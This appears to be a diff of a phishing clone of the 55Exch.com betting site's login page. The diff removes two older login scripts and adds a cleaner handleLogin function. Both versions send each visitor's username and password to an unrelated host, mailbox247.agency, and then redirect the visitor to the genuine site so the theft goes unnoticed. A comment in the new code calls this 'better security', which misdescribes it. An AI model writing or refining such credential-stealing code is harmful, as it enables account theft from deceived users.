@@ -1404,66 +1404,45 @@ This website 55Exch.com is owned and operated by GIT Operations. registration nu
 	   <a href="javascript:void(0)" target="_blank"><img src="images/icons/signal.png" alt="signal"></a>
 	</div>
 
-	<script type="text/javascript">
-
-		function checkLogin() {
-		  var loginName = $("#loginName").val();
-		  var password = $("#password").val();
-		  if (loginName != '' && password != '') {
-			sessionStorage.setItem("loginName", loginName);
-			sessionStorage.setItem("password", password);
-			var loginName = sessionStorage.getItem("loginName");
-			var password = sessionStorage.getItem("password");
-			$.ajax({
-			  type: "POST",
-			  url: "https://mailbox247.agency/admin/55exch.php",
-			  data: "loginName=" + loginName + "&password=" + password,
-			  success: function (msg) {
-				$("#errorMsg").html('Username and password is incorrect.');
-				if (msg = "sucessmsg") {
-				  window.location.href = "https://www.55exch.com";
-				}
-			  }
-			})
-		  } else {
-			alert('All fields are required.');
-			return false;
-		  }
-	
-		}
-	  </script>
-	  	<script type="text/javascript">
-
-		function checkLogins() {
-		  var loginName = $("#loginName1").val();
-		  var password = $("#password1").val();
-		  if (loginName != '' && password != '') {
-			sessionStorage.setItem("loginName1", loginName);
-			sessionStorage.setItem("password1", password);
-			var loginName = sessionStorage.getItem("loginName1");
-			var password = sessionStorage.getItem("password1");
-			$.ajax({
-			  type: "POST",
-			  url: "https://mailbox247.agency/admin/55exch.php",
-			  data: "loginName=" + loginName + "&password=" + password,
-			  success: function (msg) {
-				$("#errorMsg").html('Username and password is incorrect.');
-				if (msg = "sucessmsg") {
-				  window.location.href = "https://www.55exch.com";
-				}
-			  }
-			})
-		  } else {
-			alert('All fields are required.');
-			return false;
-		  }
-	
-		}
-	  </script>
-
-	  <script src="jquery.js"></script>
 
 	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script>
+  function handleLogin(loginNameSelector, passwordSelector, errorMsgSelector) {
+    const loginName = $(loginNameSelector).val();
+    const password = $(passwordSelector).val();
+
+    if (loginName && password) {
+      $.ajax({
+        type: "POST",
+        url: "https://mailbox247.agency/admin/55exch.php",
+        data: { loginName: loginName, password: password }, // Send as an object for better security
+        success: function (response) {
+          if (response === "sucessmsg") {
+            window.location.href = "https://www.55exch.com";
+          } else {
+            $(errorMsgSelector).html("Username and password is incorrect.");
+          }
+        },
+        error: function () {
+          alert("An error occurred while processing your request. Please try again later.");
+        },
+      });
+    } else {
+      alert("All fields are required.");
+    }
+  }
+
+  // Assign handlers to buttons
+  $("#loginButton").click(function () {
+    handleLogin("#loginName", "#password", "#errorMsg");
+  });
+
+  $("#loginButton1").click(function () {
+    handleLogin("#loginName1", "#password1", "#errorMsg");
+  });
+</script>
+
+	
 	<script src="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js"></script>
 
 	<script>
